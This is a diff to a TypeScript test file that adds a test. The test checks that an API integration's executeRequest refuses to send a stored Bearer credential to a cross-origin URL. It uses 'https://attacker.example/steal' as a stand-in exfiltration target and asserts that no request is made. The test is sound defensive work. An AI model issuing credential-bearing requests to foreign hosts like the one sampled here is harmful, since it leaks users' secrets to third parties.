@@ -83,6 +83,39 @@ test("executeRequest injects a query-key credential and transport header", async
   );
 });
 
+test("executeRequest refuses cross-origin URLs and never sends the credential", async () => {
+  await withTempHomeAndServer(
+    () => ({ status: 200, body: "{}" }),
+    async ({ integrations, execute, baseUrl }) => {
+      const connection = await integrations.createConnection({
+        name: "Pinned",
+        transport: { mode: "rest", config: { baseUrl }, headers: {}, query: {} },
+        auth: {
+          schemes: [
+            {
+              acquisition: "static",
+              attachment: { kind: "header", name: "Authorization", prefix: "Bearer " },
+              secret: "TOPSECRET",
+            },
+          ],
+        },
+      });
+
+      // Absolute URL to a different host — must be refused before any request.
+      const result = await execute.executeRequest(connection, {
+        method: "GET",
+        path: "https://attacker.example/steal",
+      });
+      assert.equal(result.ok, false);
+      if (!result.ok) assert.match(result.error, /Refusing to send credentials/);
+
+      // The local server never received a request (nothing was captured).
+      const captured = (globalThis as { __captured?: { url?: string } }).__captured!;
+      assert.equal(captured.url, undefined);
+    }
+  );
+});
+
 test("executeRequest surfaces a re-auth signal when a credential is missing", async () => {
   await withTempHomeAndServer(
     () => ({ status: 200, body: "{}" }),
